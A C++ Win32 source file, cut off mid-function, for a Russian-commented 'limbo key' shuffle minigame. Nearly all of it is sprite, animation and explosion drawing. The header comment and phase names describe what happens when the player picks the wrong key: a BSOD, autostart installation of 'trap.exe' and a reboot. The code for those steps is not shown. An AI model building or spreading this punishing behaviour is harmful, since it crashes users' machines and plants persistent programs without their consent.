/*
 * limbo key.exe — миниигра «8 ключей» (реализация по мотивам limbo-godot,
 * чистый C++, без движка).
 *
 * Фазы: спавн ключей (сетка 2x4) -> мигание верного ключа ЗЕЛЁНЫМ ->
 * 26 ходов перемешивания (курсор спрятан; после каждого хода ключи
 * «нормальные», без наклона) -> круг (вращение кольца + очень быстрое
 * вращение каждого ключа вокруг оси, наведение увеличивает ключ и показывает
 * «руку») -> клик мышью -> катсцена «компьютер и шипы» (фон background.png,
 * компьютер pc.png из resources/cat-scene) -> коснулся шипов:
 * правильно — выход / неправильно — BSOD -> автозагрузка trap.exe ->
 * перезагрузка.
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <mmsystem.h>
#include <objidl.h>
#include <gdiplus.h>
#include <algorithm>
#include <cmath>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

#include "config.h"
#include "utils.h"
#include "guard.h"

using std::wstring;

static HINSTANCE g_hinst;
static HWND g_hwnd;
static HDC g_mdc = NULL;
static HBITMAP g_dib = NULL, g_old = NULL;
static int g_W = 0, g_H = 0;
static DWORD g_bg[KEY_COUNT] = KEY_COLORS;

static int g_gridX, g_gridY;
static int g_cx, g_cy, g_radius;

static ULONGLONG g_now = 0;
static ULONGLONG g_lastTick = 0;
static ULONGLONG g_gameStart = 0;   /* для синхронизации с треком */

enum Phase {
    PH_SPAWN, PH_WAIT, PH_BLINK, PH_SHUFFLE, PH_CIRCLE_IN, PH_CIRCLE,
    PH_FLASH, PH_CUT_WIN, PH_CUT_LOSE, PH_BSOD, PH_INSTALL, PH_EXIT
};
static Phase g_phase = PH_SPAWN;
static ULONGLONG g_phaseStart = 0;
static bool g_wasOpaque = false;

struct Key {
    int slot;
    float x, y, fx, fy, tx, ty;
    ULONGLONG t0;
    DWORD dur;
    bool animating;
    bool visible;
    bool correct;
    float baseAngle;
    /* плавное увеличение под курсором */
    float scale;
    /* вращение ключа во время анимации */
    float rot, rot0, rot1;
    bool doRot;
    /* дуговое движение (спец-ход «блок-свап») */
    bool arc;
    float ax, ay, aR, a0, a1;
};
static Key g_keys[KEY_COUNT];
static int g_correctIndex = -1;

static int g_moveIndex = 0;
static float g_rot = 0;

static float g_csX = 0, g_csY = 0, g_csRot = 0;
static float g_bgScroll = 0, g_spScroll = 0;   /* скролл катсцены влево */
static bool  g_boom = false;                   /* взрыв при неверном ключе */
static ULONGLONG g_boomStart = 0;
static float g_shuffleSpeed = SHUFFLE_SPEED_DEFAULT;  /* из settings.ini */
static bool g_csFallen = false;
static ULONGLONG g_csFallStart = 0;
static ULONGLONG g_csExitAt = 0;

static bool g_pickCorrect = false;
static ULONGLONG g_circleStart = 0;
static COLORREF g_flashColor = RGB(255, 146, 0);   /* цвет вспышки после клика */
static int g_hoverKey = -1;                        /* ключ под курсором (только в кругу) */
static ULONGLONG g_hintUntil = 0;                  /* мигание верного ключа после Ctrl+Shift+Alt+K */

static bool g_bsodHit = false;
static bool g_installDone = false;

/* dev-автотест (env LIMBO_AUTO) */
static int g_autoMode = 0;      /* 0 = нет, 1 = wrong, 2 = correct */
static bool g_autoClicked = false;
static std::string g_outcome = "LOSE";

static HFONT g_fontBig = NULL, g_fontMed = NULL, g_fontSmall = NULL;

/* спрайт ключа: 8 оттенков, перекрашенных из resources/keys/key.png.
 * Порядок вариантов = порядок KEY_COLORS (1=оранжевый база, 3=зелёный). */
static HDC g_varDC[KEY_COUNT] = {0};
static HBITMAP g_varBmp[KEY_COUNT] = {0};
static BYTE *g_varBits[KEY_COUNT] = {0};
static int g_sw = 0, g_sh = 0;
static bool g_hasSprite = false;
static HDC g_tmpDC = NULL;
static HBITMAP g_tmpBmp = NULL, g_tmpOld = NULL;
static BYTE *g_tmpBits = NULL;
#define TMP_CANVAS 160

/* катсцена: фон и компьютер из resources/cat-scene/*.png */
static HDC g_bgDC = NULL, g_pcDC = NULL, g_pcTmpDC = NULL, g_spDC = NULL;
static HBITMAP g_bgBmp = NULL, g_pcBmp = NULL, g_pcTmpBmp = NULL, g_pcTmpOld = NULL,
               g_spBmp = NULL;
static BYTE *g_pcTmpBits = NULL;
static int g_bgW = 0, g_bgH = 0, g_pcW = 0, g_pcH = 0, g_spW = 0, g_spH = 0;
static bool g_hasBg = false, g_hasPc = false, g_hasSp = false;
#define PC_TMP_CANVAS 1024

/* размеры компьютера на экране (пересчитываются от высоты экрана) */
static int g_pcDW = 0, g_pcDH = 0;

static bool g_qr[21 * 21];

/* ---------- мелкие хелперы ---------- */
static ULONGLONG nowms() { return GetTickCount64(); }
static float lerpf(float a, float b, float t) { return a + (b - a) * t; }
static float smoothf(float t) { return t * t * (3.0f - 2.0f * t); }
static float clampf(float v, float a, float b) {
    if (v < a) return a;
    if (v > b) return b;
    return v;
}
static int rnd(int a, int b) { return a + rand() % (b - a + 1); }

static void start_phase(Phase p) {
    /* во время перемешивания курсор спрятан, после — снова виден */
    if (p == PH_SHUFFLE && g_phase != PH_SHUFFLE) {
        int c; do { c = ShowCursor(FALSE); } while (c >= 0);
    }
    if (g_phase == PH_SHUFFLE && p != PH_SHUFFLE) {
        int c; do { c = ShowCursor(TRUE); } while (c < 0);
    }
    g_phase = p;
    g_phaseStart = g_now;
}

static void slotXY(int slot, int *px, int *py) {
    int col = (slot - 1) % GRID_COLS;
    int row = (slot - 1) / GRID_COLS;
    *px = g_gridX + col * (KEY_SIZE + KEY_SPACING);
    *py = g_gridY + row * (KEY_SIZE + KEY_SPACING);
}

/* индекс видимого ключа под точкой (или -1) */
static int hover_key_at(int mx, int my) {
    for (int i = 0; i < KEY_COUNT; i++) {
        if (!g_keys[i].visible) continue;
        float dx = mx - g_keys[i].x;
        float dy = my - g_keys[i].y;
        if (dx * dx + dy * dy <= (float)(KEY_HIT_RADIUS * KEY_HIT_RADIUS))
            return i;
    }
    return -1;
}

static void updateKeyAnim(Key &k) {
    if (!k.animating) return;
    if (g_now < k.t0) return;   /* отложенный старт (спин по очереди) */
    double p = (double)(g_now - k.t0) / (double)k.dur;
    if (p >= 1.0) {
        k.x = k.tx; k.y = k.ty;
        k.animating = false;
        k.arc = false;
        /* наклон сохраняется между ходами (не сбрасываем) */
        if (k.doRot) k.rot = k.rot1;
        return;
    }
    float t = smoothf((float)p);
    if (k.arc) {
        float ang = k.a0 + (k.a1 - k.a0) * t;
        k.x = k.ax + k.aR * cosf(ang);
        k.y = k.ay + k.aR * sinf(ang);
    } else {
        k.x = lerpf(k.fx, k.tx, t);
        k.y = lerpf(k.fy, k.ty, t);
    }
    if (k.doRot) k.rot = lerpf(k.rot0, k.rot1, t);
}

static void animKey(Key &k, float tx, float ty, DWORD dur,
                    float rotTo = 0.0f, bool doRot = false, ULONGLONG delay = 0) {
    k.fx = k.x; k.fy = k.y;
    k.tx = tx; k.ty = ty;
    k.t0 = g_now + delay; k.dur = dur;
    k.animating = true;
    k.arc = false;
    k.doRot = doRot;
    if (doRot) { k.rot0 = k.rot; k.rot1 = rotTo; }
}

static void animKeyArc(Key &k, float tx, float ty, DWORD dur, int sweepDir) {
    k.fx = k.x; k.fy = k.y;
    k.tx = tx; k.ty = ty;
    k.t0 = g_now; k.dur = dur;
    k.animating = true;
    k.arc = true;
    k.ax = (k.fx + k.tx) / 2.0f;
    k.ay = (k.fy + k.ty) / 2.0f;
    float dx = k.fx - k.ax;
    float dy = k.fy - k.ay;
    k.aR = sqrtf(dx * dx + dy * dy);
    k.a0 = atan2f(dy, dx);
    k.a1 = k.a0 + 3.14159265f * (float)sweepDir;
    k.doRot = true;
    /* поворот относительный: наклон копится, а не сбрасывается */
    k.rot0 = k.rot;
    k.rot1 = k.rot + 3.14159265f * (float)sweepDir;
}

static bool anyKeyAnimating() {
    for (int i = 0; i < KEY_COUNT; i++)
        if (g_keys[i].animating) return true;
    return false;
}

static void circlePos(Key &k, float rotDeg) {
    float a = (k.baseAngle + rotDeg) * 3.14159265f / 180.0f;
    k.x = g_cx + g_radius * cosf(a);
    k.y = g_cy + g_radius * sinf(a);
}

/* ---------- паттерны перемешивания (из limbo-godot) ---------- */
static const int STEP_MAP[21][8] = {
    {2, 4, 1, 3, 6, 8, 5, 7},
    {2, 4, 1, 3, 7, 5, 8, 6},
    {3, 1, 4, 2, 6, 8, 5, 7},
    {3, 1, 4, 2, 7, 5, 8, 6},
    {2, 4, 1, 6, 3, 8, 5, 7},
    {3, 1, 5, 2, 7, 4, 8, 6},
    {2, 1, 4, 3, 6, 5, 8, 7},
    {4, 3, 2, 1, 8, 7, 6, 5},
    {3, 4, 5, 6, 7, 8, 2, 1},
    {8, 7, 1, 2, 3, 4, 5, 6},
    {1, 3, 2, 5, 4, 7, 8, 6},
    {1, 3, 2, 5, 4, 8, 6, 7},
    {4, 2, 6, 1, 7, 3, 8, 5},
    {4, 2, 6, 1, 8, 3, 5, 7},
    {2, 4, 6, 1, 8, 3, 7, 5},
    {4, 1, 6, 2, 8, 3, 7, 5},
    {2, 3, 1, 5, 4, 7, 6, 8},
    {3, 1, 2, 5, 4, 7, 6, 8},
    {5, 6, 7, 8, 1, 2, 3, 4},
    {8, 7, 6, 5, 4, 3, 2, 1},
    {1, 2, 3, 4, 5, 6, 7, 8}
};

static int patternForMove(int i) {
    if (i == 5)  return 18;   /* первый блок-свап: разворот на 180° */
    if (i == 12) return 19;   /* второй блок-свап: через ~3 с после первого */
    if (i == 25) return 20;
    int pick = rand() % 16;
    if (pick <= 7) return pick;
    return 10 + (pick - 8);
}

static DWORD moveDur(int i) {
    DWORD base = (i == 25) ? FINAL_MOVE_MS
               : (i == 5 || i == 12) ? (DWORD)SPECIAL_MOVE_MS : (DWORD)MOVE_MS;
    return (DWORD)(base / g_shuffleSpeed + 0.5f);
}

static void beginMove(int i) {
    int pat = patternForMove(i);
    for (int k = 0; k < KEY_COUNT; k++) {
        Key &K = g_keys[k];
        int newSlot = STEP_MAP[pat][K.slot - 1];
        int px, py;
        slotXY(newSlot, &px, &py);
        if (i == 5 || i == 12) {
            /* блок-свап: ключи идут по дуге (верхний блок по часовой,
             * нижний — против) и поворачиваются на 180°. */
            int dir = (K.slot <= 4) ? 1 : -1;
            animKeyArc(K, (float)px, (float)py, moveDur(i), dir);
        } else {
            animKey(K, (float)px, (float)py, moveDur(i));
        }
        K.slot = newSlot;
    }
}

/* ---------- отрисовка ---------- */
static COLORREF grayf(float b) {
    int v = (int)(b * 255.0f);
    if (v > 255) v = 255;
    return RGB(v, v, v);
}

static void clear_buf(DWORD rgb) {
    HBRUSH br = CreateSolidBrush(rgb);
    RECT r = {0, 0, g_W, g_H};
    FillRect(g_mdc, &r, br);
    DeleteObject(br);
}

/* ---------- спрайт ключа (key.png) и перекраска оттенков ---------- */

static void rgb2hsv(float r, float g, float b, float *h, float *s, float *v) {
    float mx = r > g ? (r > b ? r : b) : (g > b ? g : b);
    float mn = r < g ? (r < b ? r : b) : (g < b ? g : b);
    float d = mx - mn;
    *v = mx;
    *s = mx > 0.0001f ? d / mx : 0.0f;
    if (d <= 0.0001f) { *h = 0; return; }
    if (mx == r)      *h = fmodf(60.0f * ((g - b) / d), 360.0f);
    else if (mx == g) *h = 60.0f * ((b - r) / d) + 120.0f;
    else              *h = 60.0f * ((r - g) / d) + 240.0f;
    if (*h < 0) *h += 360.0f;
}

static void hsv2rgb(float h, float s, float v, float *r, float *g, float *b) {
    float c = v * s;
    float x = c * (1.0f - fabsf(fmodf(h / 60.0f, 2.0f) - 1.0f));
    float m = v - c;
    float rr, gg, bb;
    if (h < 60)       { rr = c; gg = x; bb = 0; }
    else if (h < 120) { rr = x; gg = c; bb = 0; }
    else if (h < 180) { rr = 0; gg = c; bb = x; }
    else if (h < 240) { rr = 0; gg = x; bb = c; }
    else if (h < 300) { rr = x; gg = 0; bb = c; }
    else              { rr = c; gg = 0; bb = x; }
    *r = rr + m; *g = gg + m; *b = bb + m;
}

/* Сдвиг оттенка в straight-alpha BGRA буфере. */
static void hue_shift(BYTE *px, int n, float delta) {
    if (fabsf(delta) < 0.5f) return;
    for (int i = 0; i < n; i++) {
        BYTE *p = px + (size_t)i * 4;
        float r = p[2] / 255.0f, g = p[1] / 255.0f, b = p[0] / 255.0f;
        float h, s, v;
        rgb2hsv(r, g, b, &h, &s, &v);
        if (s <= 0.05f || v <= 0.02f) continue;   /* серые/прозрачные не трогаем */
        h += delta;
        if (h >= 360.0f) h -= 360.0f;
        if (h < 0.0f)    h += 360.0f;
        hsv2rgb(h, s, v, &r, &g, &b);
        p[0] = (BYTE)(b * 255.0f + 0.5f);
        p[1] = (BYTE)(g * 255.0f + 0.5f);
        p[2] = (BYTE)(r * 255.0f + 0.5f);
    }
}

/* straight alpha -> premultiplied (формат AlphaBlend). */
static void premultiply(BYTE *px, int n) {
    for (int i = 0; i < n; i++) {
        BYTE *p = px + (size_t)i * 4;
        int a = p[3];
        p[0] = (BYTE)(p[0] * a / 255);
        p[1] = (BYTE)(p[1] * a / 255);
        p[2] = (BYTE)(p[2] * a / 255);
    }
}

static HBITMAP make_dib(HDC *outDc, int w, int h, BYTE **outBits) {
    BITMAPINFO bi = {0};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;
    HDC dc = CreateCompatibleDC(g_mdc);
    void *bits = NULL;
    HBITMAP bmp = CreateDIBSection(dc, &bi, DIB_RGB_COLORS, &bits, NULL, 0);
    if (!bmp) { DeleteDC(dc); return NULL; }
    SelectObject(dc, bmp);
    *outDc = dc;
    *outBits = (BYTE *)bits;
    return bmp;
}

/* PNG -> straight-alpha BGRA через GDI+ LockBits (без premultiply). */
static bool load_png_bits(const wstring &path, BYTE **outBits, int *outW, int *outH) {
    Gdiplus::GdiplusStartupInput si;
    ULONG_PTR tok = 0;
    if (Gdiplus::GdiplusStartup(&tok, &si, NULL) != Gdiplus::Ok) return false;
    bool ok = false;
    {
        Gdiplus::Bitmap bmp(path.c_str());
        if (bmp.GetLastStatus() == Gdiplus::Ok && bmp.GetWidth() > 0 &&
            bmp.GetHeight() > 0) {
            int w = (int)bmp.GetWidth(), h = (int)bmp.GetHeight();
            Gdiplus::Rect rc(0, 0, w, h);
            Gdiplus::BitmapData bd;
            if (bmp.LockBits(&rc, Gdiplus::ImageLockModeRead,
                             PixelFormat32bppARGB, &bd) == Gdiplus::Ok) {
                BYTE *out = (BYTE *)malloc((size_t)w * h * 4);
                if (out) {
                    for (int y = 0; y < h; y++)
                        memcpy(out + (size_t)y * w * 4,
                               (const BYTE *)bd.Scan0 + (size_t)(ptrdiff_t)bd.Stride * y,
                               (size_t)w * 4);
                    *outBits = out; *outW = w; *outH = h;
                    ok = true;
                }
                bmp.UnlockBits(&bd);
            }
        }
    }
    Gdiplus::GdiplusShutdown(tok);
    return ok;
}

static bool init_sprites() {
    BYTE *raw = NULL;
    wstring path = util::join(util::join(util::app_dir(), KEYS_SUBDIR), KEY_SPRITE_FILE);
    if (!load_png_bits(path, &raw, &g_sw, &g_sh))
        return false;

    /* базовый оттенок спрайта — средний по кругу hue насыщенных пикселей */
    float baseHue = 30.0f;   /* оранжевый генератора */
    {
        float hx = 0, hy = 0; int cnt = 0;
        for (int i = 0; i < g_sw * g_sh; i++) {
            const BYTE *p = raw + (size_t)i * 4;
            if (p[3] < 40) continue;
            float h, s, v;
            rgb2hsv(p[2] / 255.0f, p[1] / 255.0f, p[0] / 255.0f, &h, &s, &v);
            if (s < 0.30f || v < 0.20f) continue;
            hx += cosf(h * 3.14159265f / 180.0f);
            hy += sinf(h * 3.14159265f / 180.0f);
            cnt++;
        }
        if (cnt > 8) {
            baseHue = atan2f(hy, hx) * 180.0f / 3.14159265f;
            if (baseHue < 0) baseHue += 360.0f;
        }
    }

    /* целевые оттенки (порядок KEY_COLORS): red orange yellow green cyan
     * blue purple pink; оранжевый = база без сдвига */
    static const float TARGET_HUE[KEY_COUNT] =
        { 356.0f, 30.0f, 50.0f, 135.0f, 188.0f, 220.0f, 278.0f, 322.0f };

    for (int i = 0; i < KEY_COUNT; i++) {
        g_varBmp[i] = make_dib(&g_varDC[i], g_sw, g_sh, &g_varBits[i]);
        if (!g_varBmp[i]) break;
        memcpy(g_varBits[i], raw, (size_t)g_sw * g_sh * 4);
        hue_shift(g_varBits[i], g_sw * g_sh, TARGET_HUE[i] - baseHue);
        premultiply(g_varBits[i], g_sw * g_sh);
    }
    free(raw);

    g_tmpBmp = make_dib(&g_tmpDC, TMP_CANVAS, TMP_CANVAS, &g_tmpBits);
    g_tmpOld = (HBITMAP)SelectObject(g_tmpDC, g_tmpBmp);

    g_hasSprite = (g_tmpBmp != NULL);
    for (int i = 0; i < KEY_COUNT; i++)
        if (!g_varDC[i]) g_hasSprite = false;
    return g_hasSprite;
}

/* Поворотный вывод premultiplied-спрайта: без поворота — прямой AlphaBlend,
 * с поворотом — PlgBlt в прозрачный темп и затем AlphaBlend. */
static void blit_rot(HDC src, int sw, int sh, HDC tmpDC, BYTE *tmpBits, int tmpN,
                     int cx, int cy, int dw, int dh, float rot) {
    BLENDFUNCTION bf = {AC_SRC_OVER, 0, 255, AC_SRC_ALPHA};
    float cs = cosf(rot), sn = sinf(rot);

    /* быстрый путь ТОЛЬКО для 0° (cos=+1): при 180° (cos=-1) тоже прямые
     * оси, но рисунок перевёрнут — обязано идти через PlgBlt */
    if (cs > 0.9999f && fabsf(sn) < 0.01f) {
        AlphaBlend(g_mdc, cx - dw / 2, cy - dh / 2, dw, dh,
                   src, 0, 0, sw, sh, bf);
        return;
    }

    memset(tmpBits, 0, (size_t)tmpN * tmpN * 4);   /* прозрачный */
    const float T = (float)tmpN;
    float halfX = dw / 2.0f, halfY = dh / 2.0f;
    POINT pts[3];
    pts[0].x = (LONG)(T / 2 - halfX * cs + halfY * sn);   /* верхний-левый */
    pts[0].y = (LONG)(T / 2 - halfX * sn - halfY * cs);
    pts[1].x = (LONG)(T / 2 + halfX * cs + halfY * sn);   /* верхний-правый */
    pts[1].y = (LONG)(T / 2 + halfX * sn - halfY * cs);
    pts[2].x = (LONG)(T / 2 - halfX * cs - halfY * sn);   /* нижний-левый */
    pts[2].y = (LONG)(T / 2 - halfX * sn + halfY * cs);
    PlgBlt(tmpDC, pts, src, 0, 0, sw, sh, NULL, 0, 0);
    AlphaBlend(g_mdc, cx - tmpN / 2, cy - tmpN / 2,
               tmpN, tmpN, tmpDC, 0, 0, tmpN, tmpN, bf);
}

static void draw_key_sprite(int idx, int cx, int cy, float rot, float scale = 1.0f) {
    HDC src = g_varDC[idx];
    if (!src) return;
    int dw = (int)(KEY_SPRITE_DEST * scale);
    int dh = (int)(KEY_SPRITE_DEST * scale) * g_sh / g_sw;
    blit_rot(src, g_sw, g_sh, g_tmpDC, g_tmpBits, TMP_CANVAS,
             cx, cy, dw, dh, rot);
}

/* ---------- катсцена: фон и компьютер из resources/cat-scene ---------- */

static void draw_computer(int cx, int cy, float bright, float rot);   /* фолбэк-рисование ниже */

/* PNG -> premultiplied DIB-спрайт */
static bool load_png_sprite(const wstring &path, HDC *outDc, HBITMAP *outBmp,
                            int *outW, int *outH) {
    BYTE *raw = NULL;
    int w = 0, h = 0;
    if (!load_png_bits(path, &raw, &w, &h)) return false;
    HDC dc = NULL;
    BYTE *bits = NULL;
    HBITMAP bmp = make_dib(&dc, w, h, &bits);
    if (!bmp) { free(raw); return false; }
    memcpy(bits, raw, (size_t)w * h * 4);
    premultiply(bits, w * h);
    free(raw);
    *outDc = dc; *outBmp = bmp; *outW = w; *outH = h;
    return true;
}

static void init_catscene() {
    wstring dir = util::join(util::app_dir(), CATSCENE_SUBDIR);
    /* фон: сначала авторский background.jpg (если есть), потом заглушка .png */
    g_hasBg = load_png_sprite(util::join(dir, CATSCENE_BG_JPG_FILE),
                              &g_bgDC, &g_bgBmp, &g_bgW, &g_bgH);
    if (!g_hasBg)
        g_hasBg = load_png_sprite(util::join(dir, CATSCENE_BG_FILE),
                                  &g_bgDC, &g_bgBmp, &g_bgW, &g_bgH);
    g_hasPc = load_png_sprite(util::join(dir, CATSCENE_PC_FILE),
                              &g_pcDC, &g_pcBmp, &g_pcW, &g_pcH);
    g_hasSp = load_png_sprite(util::join(dir, CATSCENE_SPIKES_FILE),
                              &g_spDC, &g_spBmp, &g_spW, &g_spH);
    if (g_hasPc) {
        g_pcTmpBmp = make_dib(&g_pcTmpDC, PC_TMP_CANVAS, PC_TMP_CANVAS,
                              &g_pcTmpBits);
        if (!g_pcTmpBmp) {
            g_hasPc = false;
        } else {
            g_pcTmpOld = (HBITMAP)SelectObject(g_pcTmpDC, g_pcTmpBmp);
            g_pcDH = (int)(g_H * PC_DEST_HEIGHT_FRAC);
            if (g_pcDH < 8) g_pcDH = 8;
            g_pcDW = g_pcDH * g_pcW / g_pcH;
            if (g_pcDW < 8) g_pcDW = 8;
            if (g_pcDW > PC_TMP_CANVAS - 16) {
                g_pcDW = PC_TMP_CANVAS - 16;
                g_pcDH = g_pcDW * g_pcH / g_pcW;
            }
        }
    }
}

/* фон катсцены: background.png едет влево, за ним второй такой же (бесшовно).
 * Фолбэк — серая заливка. */
static void draw_background() {
    if (g_hasBg) {
        BLENDFUNCTION bf = {AC_SRC_OVER, 0, 255, AC_SRC_ALPHA};
        int off = (int)g_bgScroll % g_W;
        AlphaBlend(g_mdc, -off, 0, g_W, g_H, g_bgDC, 0, 0, g_bgW, g_bgH, bf);
        if (off > 0)
            AlphaBlend(g_mdc, g_W - off, 0, g_W, g_H, g_bgDC, 0, 0, g_bgW, g_bgH, bf);
    } else {
        clear_buf(grayf(AMBIENT_BRIGHTNESS));
    }
}

/* взрыв в стиле Geometry Dash: белая вспышка, расширяющееся голубое кольцо
 * с белой каймой, запаздывающее внутреннее кольцо и разлетающиеся частицы */
static void draw_ring(float cx, float cy, float radius, float width, COLORREF col) {
    if (radius < 2 || width < 1) return;
    HPEN p = CreatePen(PS_SOLID, (int)width, col);
    HGDIOBJ op = SelectObject(g_mdc, p);
    HGDIOBJ ob = SelectObject(g_mdc, GetStockObject(NULL_BRUSH));
    int r = (int)radius;
    Ellipse(g_mdc, (int)cx - r, (int)cy - r, (int)cx + r, (int)cy + r);
    SelectObject(g_mdc, ob);
    SelectObject(g_mdc, op);
    DeleteObject(p);
}

static void draw_dot(float x, float y, float r, COLORREF col) {
    if (r < 1) return;
    HPEN p = (HPEN)GetStockObject(NULL_PEN);
    HGDIOBJ op = SelectObject(g_mdc, p);
    HBRUSH b = CreateSolidBrush(col);
    HGDIOBJ ob = SelectObject(g_mdc, b);
    int ri = (int)r;
    Ellipse(g_mdc, (int)x - ri, (int)y - ri, (int)x + ri, (int)y + ri);
    SelectObject(g_mdc, ob);
    SelectObject(g_mdc, op);
    DeleteObject(b);
}

static void draw_explosion(float cx, float cy, float t) {
    if (t < 0) t = 0;
    if (t > 1) t = 1;
    const float PI = 3.14159265f;
    float ease = 1.0f - (1.0f - t) * (1.0f - t);
    float r0 = g_pcDH * 0.5f;
    float R = r0 + ((float)g_H * 0.30f - r0) * ease;
    float w = g_pcDH * 0.22f * (1.0f - t) + 2.0f;

    /* белая вспышка в центре, быстро гаснет */
    if (t < 0.28f)
        draw_dot(cx, cy, R * 0.62f * (1.0f - t / 0.28f), RGB(240, 250, 255));

    /* внешняя белая кайма и основное голубое кольцо */
    draw_ring(cx, cy, R + w * 0.55f, w * 0.45f, RGB(235, 248, 255));
    draw_ring(cx, cy, R, w, RGB(90, 195, 255));

    /* внутреннее тёмно-голубое кольцо, вылетает с запаздыванием */
    if (t > 0.12f) {
        float t2 = (t - 0.12f) / 0.88f;
        draw_ring(cx, cy, R * 0.62f * (0.4f + 0.6f * t2),
                  w * 0.5f * (1.0f - t2) + 1.0f, RGB(30, 130, 250));
    }

    /* частицы: маленькие круги разлетаются и тают */
    struct Pt { float deg, k, sz; };
    static const Pt pts[16] = {
        {   8.0f, 1.10f, 9}, {  26.0f, 1.38f, 7}, {  47.0f, 0.95f, 8},
        {  71.0f, 1.30f, 6}, {  95.0f, 1.05f, 9}, { 118.0f, 1.45f, 6},
        { 142.0f, 0.92f, 8}, { 163.0f, 1.22f, 7}, { 188.0f, 1.12f, 9},
        { 209.0f, 1.40f, 6}, { 231.0f, 0.98f, 8}, { 254.0f, 1.28f, 7},
        { 276.0f, 1.08f, 9}, { 297.0f, 1.36f, 6}, { 319.0f, 0.94f, 8},
        { 341.0f, 1.20f, 7}};
    for (int i = 0; i < 16; i++) {
        float a = pts[i].deg * PI / 180.0f;
        float d = R * pts[i].k * (0.75f + 0.35f * ease);
        COLORREF c = (i % 3 == 0) ? RGB(240, 250, 255)
                   : (i % 3 == 1) ? RGB(90, 195, 255)
                                  : RGB(30, 130, 250);
        draw_dot(cx + cosf(a) * d, cy + sinf(a) * d * 0.92f,
                 pts[i].sz * (1.0f - t), c);
    }
}

/* компьютер: pc.png с поворотом (фолбэк — процедурный рисунок) */
static void draw_pc(int cx, int cy, float rot) {
    if (g_hasPc && g_pcTmpDC) {
        blit_rot(g_pcDC, g_pcW, g_pcH, g_pcTmpDC, g_pcTmpBits, PC_TMP_CANVAS,
                 cx, cy, g_pcDW, g_pcDH, rot);
    } else {
        draw_computer(cx, cy, COMPUTER_BRIGHTNESS, rot);   /* база в точке (cx,cy) */
    }
}

static void free_sprites() {
    for (int i = 0; i < KEY_COUNT; i++) {
        if (g_varDC[i]) DeleteDC(g_varDC[i]);
        if (g_varBmp[i]) DeleteObject(g_varBmp[i]);
    }
    if (g_tmpDC && g_tmpOld) SelectObject(g_tmpDC, g_tmpOld);
    if (g_tmpBmp) DeleteObject(g_tmpBmp);
    if (g_tmpDC) DeleteDC(g_tmpDC);
    if (g_bgDC) DeleteDC(g_bgDC);
    if (g_bgBmp) DeleteObject(g_bgBmp);
    if (g_pcDC) DeleteDC(g_pcDC);
    if (g_pcBmp) DeleteObject(g_pcBmp);
    if (g_spDC) DeleteDC(g_spDC);
    if (g_spBmp) DeleteObject(g_spBmp);
    if (g_pcTmpDC && g_pcTmpOld) SelectObject(g_pcTmpDC, g_pcTmpOld);
    if (g_pcTmpBmp) DeleteObject(g_pcTmpBmp);
    if (g_pcTmpDC) DeleteDC(g_pcTmpDC);
}

/* Ключ рисуется вручную повёрнутыми полигонами: мировая трансформация GDI
 * (XFORM) на некоторых системах игнорируется при рисовании в memory-DC.
 * Используется как фолбэк, если resources/keys не найдены. */
static void draw_key(int cx, int cy, int size, DWORD color, float rot = 0.0f) {
    float f = (float)size;
    float cs = cosf(rot), sn = sinf(rot);
#define LPT(lx, ly) { (LONG)(cx + ((lx)*cs - (ly)*sn)*f), (LONG)(cy + ((lx)*sn + (ly)*cs)*f) }

    HBRUSH br = CreateSolidBrush(color);
    HPEN pen = CreatePen(PS_SOLID, 1, color);
    HGDIOBJ ob = SelectObject(g_mdc, br);
    HGDIOBJ op = SelectObject(g_mdc, pen);

    /* тело (октагон вместо скруглений) */
    POINT body[8] = {
        LPT(-0.38f, -0.13f), LPT(-0.31f, -0.20f), LPT( 0.13f, -0.20f), LPT( 0.20f, -0.13f),
        LPT( 0.20f,  0.13f), LPT( 0.13f,  0.20f), LPT(-0.31f,  0.20f), LPT(-0.38f,  0.13f),
    };
    Polygon(g_mdc, body, 8);

    /* зубцы */
    POINT p1[4] = { LPT(-0.40f, -0.16f), LPT(-0.26f, -0.16f), LPT(-0.26f, -0.05f), LPT(-0.40f, -0.05f) };
    POINT p2[4] = { LPT(-0.40f,  0.05f), LPT(-0.26f,  0.05f), LPT(-0.26f,  0.16f), LPT(-0.40f,  0.16f) };
    Polygon(g_mdc, p1, 4);
    Polygon(g_mdc, p2, 4);

    /* кольцо — круг, при повороте смещается только центр */
    int rcx = (int)(cx + 0.27f * f * cs);
    int rcy = (int)(cy + 0.27f * f * sn);
    int rr = (int)(f * 0.16f);
    Ellipse(g_mdc, rcx - rr, rcy - rr, rcx + rr, rcy + rr);

    /* дырка (цвет прозрачного фона) */
    HBRUSH hole = CreateSolidBrush(COLOR_KEY_RGB);
    HPEN hpen = CreatePen(PS_SOLID, 1, COLOR_KEY_RGB);
    SelectObject(g_mdc, hole);
    SelectObject(g_mdc, hpen);
    int hr = (int)(f * 0.09f);
    Ellipse(g_mdc, rcx - hr, rcy - hr, rcx + hr, rcy + hr);

    SelectObject(g_mdc, op);
    SelectObject(g_mdc, ob);
    DeleteObject(hpen);
    DeleteObject(hole);
    DeleteObject(pen);
    DeleteObject(br);
#undef LPT
}

static void draw_spikes() {
    /* шипы из resources/cat-scene/spikes.png (прозрачный фон), прижаты к низу,
     * едут влево быстрее фона; позади второй такой же ряд (бесшовно) */
    if (g_hasSp) {
        int dh = (int)(g_H * SPIKE_DEST_HEIGHT_FRAC);
        if (dh < 8) dh = 8;
        BLENDFUNCTION bf = {AC_SRC_OVER, 0, 255, AC_SRC_ALPHA};
        int off = (int)g_spScroll % g_W;
        AlphaBlend(g_mdc, -off, g_H - dh, g_W, dh, g_spDC, 0, 0, g_spW, g_spH, bf);
        if (off > 0)
            AlphaBlend(g_mdc, g_W - off, g_H - dh, g_W, dh, g_spDC, 0, 0, g_spW, g_spH, bf);
        return;
    }
    COLORREF col = grayf(SPIKE_BRIGHTNESS);
    HBRUSH br = CreateSolidBrush(col);
    HGDIOBJ o = SelectObject(g_mdc, br);
    int baseY = g_H - 4;
    int topY = (int)(g_H * 0.72f);
    int step = 26;
    for (int x = -step, i = 0; x < g_W; x += step, i++) {
        int peak = topY + ((i * 37) % (g_H / 14));
        POINT pts[3];
        pts[0].x = x;       pts[0].y = baseY;
        pts[1].x = x + 13;  pts[1].y = peak;
